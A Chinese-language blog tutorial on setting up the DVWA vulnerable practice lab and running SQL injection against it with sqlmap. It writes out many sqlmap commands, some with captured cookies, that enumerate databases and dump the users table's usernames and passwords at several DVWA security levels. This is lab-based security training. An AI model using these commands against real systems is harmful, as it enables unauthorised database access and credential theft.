<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SQL注入（DVWA靶场搭建及使用、sqlMap注入、sqlmap问题及解决办法） - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SQL注入（DVWA靶场搭建及使用、sqlMap注入、sqlmap问题及解决办法）" />
<meta property="og:description" content="sqlmap使用教程 1、客户端向服务端请求的流程
2、SQL注入常见分类
3、SQL注入常见过程
4、SQL注入的作用
5、常用SQL测试语句
注释字符：
DVWA靶场搭建及使用（详细图文） 一、下载DVWA
下载地址：DVWA/README.zh.md at master · digininja/DVWA · GitHub
这里我是从GitHub上下载的，小伙伴们自行选择
二、安装DVWA
在安装前，需要做一个准备工作，我们先去做一个PHP&#43;Mysql的环境搭建。
1.下载、安装、启动phpstudy，小皮面板(phpstudy) - 让天下没有难配的服务器环境！
（phpStudy是一个PHP调试环境的程序集成包。恰好我们可以用到&#34;PHP&#43;Mysql&#43;Apache&#34;。）
注意开启apache和mysql
2、将下载的DVWA解压到phpstudy网站根目录下。
例如：我这解压后的路径是“D:\phpStudy\WWW\DVWA-master\”（这里为了后面进入目录方便，我会将文件名改成DVWA）
3、将 config.inc.php.dist 复制一份或重命令为 config.inc.php；
例如：我的配置文件路径是“D:\phpStudy\WWW\DVWA-master\config”。
注意：有的小伙伴操作系统可能会默认不显示文件后缀名，改为显示后缀名之后再重命名文件类型 config.inc.php.dist→config.inc.php。这步必须做。
4、修改 config.inc.php 里代码如下：
$_DVWA[ &#39;db_server&#39; ] = &#39;127.0.0.1&#39;; #数据库地址
$_DVWA[ &#39;db_database&#39; ] = &#39;dvwa&#39;; #数据库名称
$_DVWA[ &#39;db_user&#39; ] = &#39;root&#39;; #数据库用户名
$_DVWA[ &#39;db_password&#39; ] = &#39;root&#39;; #数据库密码
因为phpstudy默认的mysql数据库地址是“127.0.0.1 或 localhost&#34;，用户名和密码都是&#34;root&#34;。主要是修改’db_password‘为root，这里很重要，修改后自然是需要保存文件的。
三、DVWA使用
1、设置或重置数据库
浏览器只需要直接打开“http://搭建环境的系统ip/DVWA-master/setup.php”即可！如果有”标红“提示，可能你要打开一些模块或做一些设置，否则有些是不能实验的，例如：文件包含、文件上传漏洞。
如：红色字体显示“DVWA-PHP function allow_url_include: Disabled”错误" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/b84e15cc770a0b9221bc1187ec870602/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-20T16:11:02+08:00" />
<meta property="article:modified_time" content="2023-10-20T16:11:02+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入（DVWA靶场搭建及使用、sqlMap注入、sqlmap问题及解决办法）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p></p> 
<h3>sqlmap使用教程</h3> 
<p>1、客户端向服务端请求的流程</p> 
<p><img alt="" height="398" src="https://images2.imgbox.com/d8/5a/iUIAgkac_o.png" width="830"></p> 
<p>2、SQL注入常见分类</p> 
<p><img alt="" height="233" src="https://images2.imgbox.com/0f/d2/ASI4dkxu_o.png" width="401"></p> 
<p> 3、SQL注入常见过程</p> 
<p><img alt="" height="205" src="https://images2.imgbox.com/ab/91/TAxzz37I_o.png" width="494"></p> 
<p> 4、SQL注入的作用</p> 
<p><img alt="" height="200" src="https://images2.imgbox.com/de/e7/NzV1HnP0_o.png" width="347"></p> 
<p> 5、常用SQL测试语句</p> 
<p><img alt="" height="258" src="https://images2.imgbox.com/da/d5/hXeKiJTv_o.png" width="474"></p> 
<p> 注释字符：</p> 
<p><img alt="" height="244" src="https://images2.imgbox.com/28/5c/zQhmv2gt_o.png" width="482"></p> 
<h3 id="articleContentId">DVWA靶场搭建及使用（详细图文）</h3> 
<p>一、下载DVWA<br> 下载地址：<a href="https://github.com/digininja/DVWA/blob/master/README.zh.md" title="DVWA/README.zh.md at master · digininja/DVWA · GitHub">DVWA/README.zh.md at master · digininja/DVWA · GitHub</a><br> 这里我是从GitHub上下载的，小伙伴们自行选择</p> 
<p>二、安装DVWA<br> 在安装前，需要做一个准备工作，我们先去做一个PHP+Mysql的环境搭建。</p> 
<p>1.下载、安装、启动phpstudy，小皮面板(phpstudy) - 让天下没有难配的服务器环境！</p> 
<p>（phpStudy是一个PHP调试环境的程序集成包。恰好我们可以用到"PHP+Mysql+Apache"。）</p> 
<p>注意开启apache和mysql</p> 
<p><img alt="" height="618" src="https://images2.imgbox.com/3b/17/8E6P6Vxv_o.png" width="830"></p> 
<p></p> 
<p>2、将下载的DVWA解压到phpstudy网站根目录下。</p> 
<p>例如：我这解压后的路径是“D:\phpStudy\WWW\DVWA-master\”（这里为了后面进入目录方便，我会将文件名改成DVWA）</p> 
<p>3、将 config.inc.php.dist 复制一份或重命令为 config.inc.php；</p> 
<p>例如：我的配置文件路径是“D:\phpStudy\WWW\DVWA-master\config”。</p> 
<p>注意：有的小伙伴操作系统可能会默认不显示文件后缀名，改为显示后缀名之后再重命名文件类型 config.inc.php.dist→config.inc.php。这步必须做。</p> 
<p>4、修改 config.inc.php 里代码如下：</p> 
<p>$_DVWA[ 'db_server' ]   = '127.0.0.1'; #数据库地址<br> $_DVWA[ 'db_database' ] = 'dvwa'; #数据库名称<br> $_DVWA[ 'db_user' ]     = 'root'; #数据库用户名<br> $_DVWA[ 'db_password' ] = 'root'; #数据库密码<br> 因为phpstudy默认的mysql数据库地址是“127.0.0.1 或 localhost"，用户名和密码都是"root"。主要是修改’db_password‘为root，这里很重要，修改后自然是需要保存文件的。</p> 
<p>三、DVWA使用</p> 
<p>1、设置或重置数据库</p> 
<p>浏览器只需要直接打开“http://搭建环境的系统ip/DVWA-master/setup.php”即可！如果有”标红“提示，可能你要打开一些模块或做一些设置，否则有些是不能实验的，例如：文件包含、文件上传漏洞。</p> 
<p>                如：<span style="color:#fe2c24;">红色字体显示“DVWA-PHP function allow_url_include: Disabled”错误</span></p> 
<p>                需要改的不是DVWA文件夹下的php.ini，而是你安装的php的php.ini。</p> 
<p>                由于我使用的是PHPstudy，找到所使用的php版本号所在文件夹，修改php.ini中的allow_url_include为On，错误得到解决。</p> 
<p>拉到下面，点击Setup/Reset DB，点击Create/Reset Database。会看到创建成功提示！</p> 
<p id="u9d468bc0"><strong>2、登陆</strong></p> 
<p id="u2d585900">浏览器打开”http://127.0.0.1/DVWA-master/login.php“登陆。默认用户名：admin，默认密码：password；</p> 
<p><span style="color:#fe2c24;">注意：若在kali中不能访问页面，需要设置或关闭Windows服务器中防火墙。</span></p> 
<p><strong>3、设置程序安全级别</strong><br> 浏览器打开”<strong>http://你自己ip/DVWA-master/security.php</strong>“来做设置，分别有”低、中、高、不可能“，程序安全级别越低，说明越容易被攻破，没有做任何的安全防护。主要是用来自我挑战不同等级的程序防护级别的！</p> 
<p><img alt="" height="471" src="https://images2.imgbox.com/97/db/pUFixsPK_o.png" width="831"></p> 
<p> 环境配置好，可以开打啦！</p> 
<h3>他山之石</h3> 
<h2><a class="link-info has-card" href="https://blog.csdn.net/Gherbirthday0916/article/details/126857683" title="sqlmap使用教程"><span class="link-card-box"><span class="link-title">sqlmap使用教程</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/b7/ec/73dkSOqv_o.png" alt="icon-default.png?t=N7T8">https://blog.csdn.net/Gherbirthday0916/article/details/126857683</span></span></a></h2> 
<h2><a class="link-info has-card" href="https://blog.csdn.net/CYwxh0125/article/details/122460851?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122460851-blog-127086871.pc_relevant_landingrelevant&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122460851-blog-127086871.pc_relevant_landingrelevant&amp;utm_relevant_index=1" title="DVWA靶场通关教程"><span class="link-card-box"><span class="link-title">DVWA靶场通关教程</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/0c/03/kO06GLsI_o.png" alt="icon-default.png?t=N7T8">https://blog.csdn.net/CYwxh0125/article/details/122460851?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122460851-blog-127086871.pc_relevant_landingrelevant&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122460851-blog-127086871.pc_relevant_landingrelevant&amp;utm_relevant_index=1</span></span></a></h2> 
<h2><a class="link-info has-card" href="https://blog.csdn.net/m0_62636343/article/details/124733514" title="SQLMAP注入DVWA实战"><span class="link-card-box"><span class="link-title">SQLMAP注入DVWA实战</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/a4/87/batjXQnH_o.png" alt="icon-default.png?t=N7T8">https://blog.csdn.net/m0_62636343/article/details/124733514</span></span></a></h2> 
<h3> sqlmap问题及解决办法</h3> 
<p>利用sqlmap对DVWA中Low进行<a href="https://mp.csdn.net/mp_blog/creation/editor/129628305" title="SQL注入">SQL注入</a></p> 
<blockquote> 
 <p>输入： python sqlmap.py -u http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1</p> 
</blockquote> 
<p> 报错：不可注入…提示</p> 
<p>用一个带上一个响应包注入成功了</p> 
<p> 切记： sqlmap.py -u 后面是跟URL<br> sqlmap.py -r 后面是跟响应数据<br> sqlmap进行注入时，最好使用-r</p> 
<p>最后再复习一下sqlmap注入命令：</p> 
<p>1、是否存在注入点</p> 
<p>python sqlmap.py -r “响应包路径”</p> 
<p>2、获取注入点所有数据库</p> 
<p>python sqlmap.py -r “响应包路径” --dbs</p> 
<p>3、获取当前使用的数据库</p> 
<p>python sqlmap.py -r “响应包路径” --current-db --batch</p> 
<p>4、获取数据库中的表</p> 
<p>python sqlmap.py -r “响应包路径” --table -D “数据库名” --batch</p> 
<p>5、获取表中的字段信息</p> 
<p>python sqlmap.py -r “响应包路径” --columns -T “表名” -D “获取的数据库名” --batch</p> 
<p>6、获取字段具体信息</p> 
<p>python sqlmap.py -r “响应包路径” --dump -C “字段名(可多个)” --columns -T “表名” -D “数据库名” --batch</p> 
<p>7、当前使用的账户</p> 
<p>python sqlmap.py -r “响应包路径” --current-user</p> 
<p>8、列出所有使用过的账户</p> 
<p>python sqlmap.py -r “响应包路径” –users</p> 
<p>9、mysql的登录账户和密码</p> 
<p>python sqlmap.py -r “响应包路径” –passwords</p> 
<p>例1：sqlmap.py -r 后面是跟响应数据</p> 
<p>第一步：复制durp工具捕获的请求代码，生成aa.txt文件。</p> 
<p><img alt="" height="321" src="https://images2.imgbox.com/21/83/E8LYs0i6_o.png" width="622"></p> 
<p>第二步：sqlmap 注入</p> 
<p><img alt="" height="69" src="https://images2.imgbox.com/6a/af/u78ZgRiJ_o.png" width="486"></p> 
<p>sqlmap -r "/home/hfy/桌面/aa.txt" -D dvwa -T users -C user,password --dump</p> 
<p>获得数据库</p> 
<p>获得dvwa库中表</p> 
<p>获得users表中列（字段）</p> 
<p>获得user,password字段值。</p> 
<p></p> 
<p>例2:sqlmap.py -u 后面是跟URL</p> 
<p>第一步：durp工具捕获的请求COOKies</p> 
<p>浏览器登录dvwa靶场——设置安全级为LOW——选择SQL Injection——输入任意ID号——点击Submit（浏览器要启用代理：127.0.0.1，端口8080）</p> 
<p><img alt="" height="505" src="https://images2.imgbox.com/ac/f3/UtTAtWQt_o.png" width="889"></p> 
<p>durp中在Proxy下开启Intercept is on</p> 
<p><img alt="" height="360" src="https://images2.imgbox.com/eb/38/5H4nJF1L_o.png" width="909"></p> 
<p>第二步：sqlmap注入</p> 
<p><span style="color:#fe2c24;">使用-u参数来指定目标URL，--dbs进行数据库爆破</span></p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit" --cookie "security=low; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" --dbs</p> 
<p>之后可得到数据库信息：</p> 
<p><img alt="" height="169" src="https://images2.imgbox.com/4b/8a/ddi892zi_o.png" width="453"></p> 
<p>爆破成功，接下来可进行数据库查看等一系列操作。</p> 
<p><span style="color:#fe2c24;">-D dvwa -tables： 查看数据库dvwa中的表</span></p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit" --cookie "security=low; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" -D dvwa -tables</p> 
<p><img alt="" height="179" src="https://images2.imgbox.com/2d/9c/fLDq8eHX_o.png" width="535"></p> 
<p><span style="color:#fe2c24;">-T users -columns：查看表user中的字段名</span></p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit" --cookie "security=low; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" -D dvwa -T users -columns<br><img alt="" height="329" src="https://images2.imgbox.com/79/b6/MhFpdlBX_o.png" width="578"></p> 
<p><span style="color:#fe2c24;">-C user,password --dump：获取字段user,password信息</span></p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit" --cookie "security=low; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" -D dvwa -T users -C user,password --dump</p> 
<p><img alt="" height="201" src="https://images2.imgbox.com/31/71/EOrFyEgd_o.png" width="511"></p> 
<p><strong>.DVWA等级--mid爆破方法：</strong></p> 
<p>同例1：sqlmap.py -r 后面是跟响应数据</p> 
<p></p> 
<p><strong>DVWA等级--high爆破方法：</strong></p> 
<p>需要二阶sql注入（--second-order）</p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/" --data "id=1&amp;Submit=Submit" --cookie "security=high; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" --second-url "http://192.168.1.2/dvwa/vulnerabilities/sqli/session-input.php"<span style="color:#fe2c24;"> --dbs</span></p> 
<p><img alt="" height="174" src="https://images2.imgbox.com/a4/54/Kw4b1HbU_o.png" width="448"></p> 
<p> 可以查看数据库信息了。</p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/" --data "id=1&amp;Submit=Submit" --cookie "security=high; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" --second-url "http://192.168.1.2/dvwa/vulnerabilities/sqli/session-input.php" <span style="color:#fe2c24;">-D dvwa -tables</span></p> 
<p>得到了数据中表信息。</p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/" --data "id=1&amp;Submit=Submit" --cookie "security=high; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" --second-url "http://192.168.1.2/dvwa/vulnerabilities/sqli/session-input.php" -D dvwa <span style="color:#fe2c24;">-T users -columns</span><br> 得到了表中字段信息。</p> 
<p>sqlmap -u "http://192.168.1.2/dvwa/vulnerabilities/sqli/" --data "id=1&amp;Submit=Submit" --cookie "security=high; PHPSESSID=0sqh5r9gjs3kog9cd3uvq1vhgv" --second-url "http://192.168.1.2/dvwa/vulnerabilities/sqli/session-input.php" -D dvwa -T users <span style="color:#fe2c24;">-C user,password -dump</span></p> 
<p>得到了user,password字段的值。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f7287a78bd6f1135128867f1ad132385/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">docker和k8s基础介绍</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/70e7e80279fb57f52c25b4370b2ab537/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">PIL.Image和cv2.imread读取图片区别</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>